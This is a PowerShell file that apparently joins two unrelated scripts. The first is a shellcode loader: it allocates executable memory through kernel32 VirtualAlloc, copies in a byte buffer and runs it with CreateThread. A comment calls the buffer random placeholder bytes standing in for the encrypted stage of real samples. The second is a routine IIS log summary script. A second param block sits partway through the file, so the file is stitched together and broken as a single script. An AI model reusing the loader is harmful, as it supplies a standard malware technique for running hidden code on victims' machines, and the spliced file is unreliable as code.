

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xe8, 0xc0, 0x8e, 0xfb, 0x5d, 0x2e, 0x8e, 0x24, 0x1a, 0x6f, 0xc9, 0x8b, 0xec, 0x30, 0xa7, 0x86,
    0xea, 0x86, 0x8d, 0x7e, 0xe0, 0x9b, 0x99, 0x1c, 0x50, 0xc0, 0xfb, 0x01, 0x53, 0x17, 0x2d, 0x00,
    0xc8, 0x14, 0x95, 0x90, 0xdb, 0x6d, 0xcc, 0x1b, 0x80, 0x28, 0x4a, 0x10, 0x41, 0x7d, 0x7b, 0x5d,
    0x05, 0x18, 0xd7, 0x94, 0xec, 0x66, 0x21, 0xde, 0xfa, 0x36, 0x97, 0xaf, 0xa9, 0x88, 0x8f, 0xc2,
    0x27, 0xaa, 0xea, 0xad, 0x15, 0x60, 0xd9, 0x48, 0xc6, 0xd5, 0x33, 0xe4, 0xe3, 0xce, 0x0c, 0x55,
    0x4e, 0x9f, 0x7b, 0x24, 0x64, 0x5c, 0x33, 0x80, 0x69, 0x43, 0x8d, 0xc9, 0xa9, 0x18, 0x0e, 0xa9,
    0xc4, 0x44, 0xf6, 0xc5, 0xfe, 0x0c, 0x6f, 0xe5, 0x61, 0x22, 0x98, 0xf1, 0xfd, 0x8e, 0xc2, 0x90,
    0xd6, 0xf6, 0x5e, 0x8a, 0x3d, 0xce, 0x14, 0xd3, 0xee, 0xd0, 0xab, 0x45, 0x44, 0x16, 0x01, 0x3a,
    0xee, 0x29, 0xb8, 0xef, 0x17, 0x42, 0xfc, 0x8d, 0xfb, 0xc6, 0x12, 0x7c, 0x12, 0xfa, 0x62, 0x2d,
    0xc8, 0xf4, 0x69, 0x37, 0x73, 0x11, 0x81, 0x8a, 0x5b, 0xa9, 0x5c, 0x5e, 0x93, 0xf2, 0xd9, 0x85,
    0x5d, 0x92, 0x29, 0xf7, 0xfc, 0x31, 0x63, 0x46, 0x30, 0xd3, 0xbe, 0x3b, 0x47, 0x46, 0x1d, 0x8a,
    0x01, 0x1c, 0xa7, 0x2c, 0xf2, 0x9e, 0xf3, 0xbb, 0x90, 0xe0, 0xba, 0x47, 0x5d, 0x65, 0xc0, 0xed,
    0x4e, 0xc6, 0xf8, 0x3b, 0xb9, 0xda, 0xca, 0x92, 0xac, 0xe8, 0x7a, 0x29, 0xb6, 0xb2, 0x42
)

$ProcHandle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 3303)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$LogRoot = 'C:\inetpub\logs\LogFiles\W3SVC1',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 30,
    [int]$TopN = 10,
    [string]$OutputPath = 'C:\Logs\reports\iis-top-2025-09-18.csv',

    [string]$HtmlPath = 'C:\Reports\iis-2025-09-18.html'
)

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}
$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$topUrls | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8

Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Segoe UI; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@
$topUrls | ConvertTo-Html -Title 'Top URLs' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8
